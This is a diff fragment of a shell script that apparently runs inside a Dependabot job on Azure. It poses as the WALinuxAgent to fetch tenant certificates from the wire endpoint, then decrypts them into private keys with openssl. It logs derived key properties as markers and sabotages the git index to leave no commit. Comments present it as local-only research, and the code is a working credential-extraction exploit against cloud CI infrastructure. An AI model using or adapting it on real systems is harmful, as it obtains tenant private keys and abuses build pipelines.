+cert_b64="$(ruby -e 'data=File.binread(ARGV[0]); data=data.gsub(/-----[^-]+-----/, "").gsub(/\s+/, ""); print data' "$transport_crt" 2>/dev/null)"
+
+cert_body="$tmp_dir/certificates.xml"
+if [ "$keygen_rc" -eq 0 ] && [ -n "$cert_b64" ]; then
+  cert_code="$(curl -ksS --connect-timeout 2 --max-time 10 --max-filesize 1048576 \
+    -H 'x-ms-agent-name: WALinuxAgent' \
+    -H 'x-ms-version: 2012-11-30' \
+    -H 'x-ms-cipher-name: AES128_CBC' \
+    -H "x-ms-guest-agent-public-x509-cert: $cert_b64" \
+    -o "$cert_body" -w '%{http_code}' "$cert_url" 2>/dev/null)"
+else
+  cert_code="keygen_error"
+fi
+unset cert_b64 cert_url WIRE_CERT_URL
+
+cert_size="$(wc -c < "$cert_body" 2>/dev/null | tr -d ' ')"
+cert_der="$tmp_dir/certificates.der"
+cert_shape="$(ruby -rrexml/document -rbase64 -e '
+  begin
+    doc = REXML::Document.new(File.binread(ARGV[0]))
+    format = REXML::XPath.first(doc, "//Format")&.text.to_s
+    data = REXML::XPath.first(doc, "//Data")&.text.to_s
+    File.binwrite(ARGV[1], Base64.decode64(data)) unless data.empty?
+    puts [format == "Pkcs7BlobWithPfxContents" ? 1 : 0, data.empty? ? 0 : 1].join(" ")
+  rescue StandardError
+    puts "0 0"
+  end
+' "$cert_body" "$cert_der" 2>/dev/null)"
+set -- ${cert_shape:-0 0}
+format_ok="$1"
+data_present="$2"
+printf 'DBOT_WIRECERT_CERTS STATUS=%s SIZE=%s FORMAT_OK=%s DATA_PRESENT=%s\n' \
+  "${cert_code:-curl_error}" "${cert_size:-0}" "$format_ok" "$data_present" >&2
+emit_marker ".dbot-wirecert-CERTS-s${cert_code:-x}-n${cert_size:-0}-f${format_ok}-d${data_present}"
+
+# Decrypt locally only when the response has the exact expected structure.
+# The resulting private material never leaves the temp directory; only block
+# counts are emitted, then the trap deletes all files.
+decrypt_rc=99
+convert_rc=99
+private_key_count=0
+certificate_count=0
+public_cert_sha16=none
+key_cert_match=0
+self_signed=0
+key_bits=0
+key_encipherment=0
+cms_roundtrip=0
+cert_valid_gt24h=0
+cert_valid_gt7d=0
+cert_valid_gt30d=0
+if [ "$cert_code" = "200" ] && [ "$format_ok" = "1" ] && [ "$data_present" = "1" ] && [ -s "$cert_der" ]; then
+  cert_pfx="$tmp_dir/certificates.pfx"
+  cert_pem="$tmp_dir/certificates.pem"
+  openssl cms -decrypt -inform DER -in "$cert_der" -inkey "$transport_key" \
+    -recip "$transport_crt" -out "$cert_pfx" >/dev/null 2>&1
+  decrypt_rc=$?
+  if [ "$decrypt_rc" -eq 0 ]; then
+    openssl pkcs12 -nodes -password pass: -in "$cert_pfx" -out "$cert_pem" -nomacver >/dev/null 2>&1
+    convert_rc=$?
+    if [ "$convert_rc" -ne 0 ]; then
+      openssl pkcs12 -nodes -password pass: -in "$cert_pfx" -out "$cert_pem" >/dev/null 2>&1
+      convert_rc=$?
+    fi
+  fi
+  if [ "$convert_rc" -eq 0 ] && [ -r "$cert_pem" ]; then
+    private_key_count="$(grep -Ec '^-----BEGIN .*PRIVATE KEY-----$' "$cert_pem" 2>/dev/null)"
+    certificate_count="$(grep -c '^-----BEGIN CERTIFICATE-----$' "$cert_pem" 2>/dev/null)"
+
+    # Emit only non-secret, minimized properties. The truncated digest lets us
+    # tell whether Azure reuses the same tenant certificate across isolated
+    # jobs without exposing its identity fields or key material.
+    tenant_crt="$tmp_dir/tenant.crt"
+    tenant_key="$tmp_dir/tenant.key"
+    cert_pub="$tmp_dir/cert.pub"
+    key_pub="$tmp_dir/key.pub"
+    if openssl x509 -in "$cert_pem" -out "$tenant_crt" >/dev/null 2>&1 &&
+       openssl pkey -in "$cert_pem" -out "$tenant_key" >/dev/null 2>&1; then
+      public_cert_sha16="$(openssl x509 -in "$tenant_crt" -outform DER 2>/dev/null |
+        openssl dgst -sha256 -r 2>/dev/null | awk '{print substr($1,1,16)}')"
+      openssl x509 -in "$tenant_crt" -pubkey -noout > "$cert_pub" 2>/dev/null
+      openssl pkey -in "$tenant_key" -pubout > "$key_pub" 2>/dev/null
+      if [ -s "$cert_pub" ] && [ -s "$key_pub" ] && cmp -s "$cert_pub" "$key_pub"; then
+        key_cert_match=1
+      fi
+      if openssl verify -CAfile "$tenant_crt" "$tenant_crt" >/dev/null 2>&1; then
+        self_signed=1
+      fi
+      key_bits="$(openssl pkey -in "$tenant_key" -text -noout 2>/dev/null |
+        sed -n 's/.*Private-Key: (\([0-9][0-9]*\) bit.*/\1/p' | head -n 1)"
+      if openssl x509 -in "$tenant_crt" -text -noout 2>/dev/null | grep -qi 'Key Encipherment'; then
+        key_encipherment=1
+      fi
+
+      # Local-only cryptographic proof over a researcher-owned nonce. No Azure
+      # service or external endpoint receives the private key or signed data.
+      cms_plain="$tmp_dir/cms-plain"
+      cms_envelope="$tmp_dir/cms-envelope.der"
+      cms_recovered="$tmp_dir/cms-recovered"
+      printf 'dependabot-owned-cms-roundtrip' > "$cms_plain"
+      if openssl cms -encrypt -binary -aes128 -in "$cms_plain" -outform DER \
+           -out "$cms_envelope" "$tenant_crt" >/dev/null 2>&1 &&
+         openssl cms -decrypt -inform DER -in "$cms_envelope" -recip "$tenant_crt" \
+           -inkey "$tenant_key" -out "$cms_recovered" >/dev/null 2>&1 &&
+         cmp -s "$cms_plain" "$cms_recovered"; then
+        cms_roundtrip=1
+      fi
+
+      cert_end="$(openssl x509 -in "$tenant_crt" -enddate -noout 2>/dev/null | sed 's/^notAfter=//')"
+      cert_lifetime="$(CERT_END="$cert_end" ruby -rtime -e '
+        begin
+          expiry = Time.parse(ENV.fetch("CERT_END")).utc
+          now = Time.now.utc
+          puts [expiry > now + 86400 ? 1 : 0, expiry > now + (7 * 86400) ? 1 : 0,
+                expiry > now + (30 * 86400) ? 1 : 0].join(" ")
+        rescue StandardError
+          puts "0 0 0"
+        end
+      ' 2>/dev/null)"
+      set -- ${cert_lifetime:-0 0 0}
+      cert_valid_gt24h="$1"
+      cert_valid_gt7d="$2"
+      cert_valid_gt30d="$3"
+      unset cert_end CERT_END
+    fi
+  fi
+fi
+
+printf 'DBOT_WIRECERT_DECRYPT DECRYPT_RC=%s CONVERT_RC=%s PRIVATE_KEY_COUNT=%s CERTIFICATE_COUNT=%s\n' \
+  "$decrypt_rc" "$convert_rc" "${private_key_count:-0}" "${certificate_count:-0}" >&2
+emit_marker ".dbot-wirecert-DECRYPT-dr${decrypt_rc}-cr${convert_rc}-pk${private_key_count:-0}-c${certificate_count:-0}"
+printf 'DBOT_WIRECERT_META CERT_SHA16=%s KEY_CERT_MATCH=%s SELF_SIGNED=%s KEY_BITS=%s\n' \
+  "${public_cert_sha16:-none}" "$key_cert_match" "$self_signed" "${key_bits:-0}" >&2
+emit_marker ".dbot-wirecert-META-h${public_cert_sha16:-none}-m${key_cert_match}-ss${self_signed}-b${key_bits:-0}"
+printf 'DBOT_AZESC_KEY_CAPABILITY KEY_ENCIPHERMENT=%s CMS_ROUNDTRIP=%s VALID_GT_24H=%s VALID_GT_7D=%s VALID_GT_30D=%s EXTERNAL_USE=0\n' \
+  "$key_encipherment" "$cms_roundtrip" "$cert_valid_gt24h" "$cert_valid_gt7d" "$cert_valid_gt30d" >&2
+emit_marker ".dbot-azesc-KEY-ke${key_encipherment}-cms${cms_roundtrip}-v24h${cert_valid_gt24h}-v7d${cert_valid_gt7d}-v30d${cert_valid_gt30d}-used0"
+
+# Keep the minimized markers in the failed Dependabot log while leaving no
+# repository change or successful malicious commit behind.
+git reset -q HEAD -- . 2>/dev/null
+index_lock="$(git rev-parse --git-path index.lock 2>/dev/null)"
+[ -n "$index_lock" ] && : > "$index_lock" 2>/dev/null
+exit 1
+
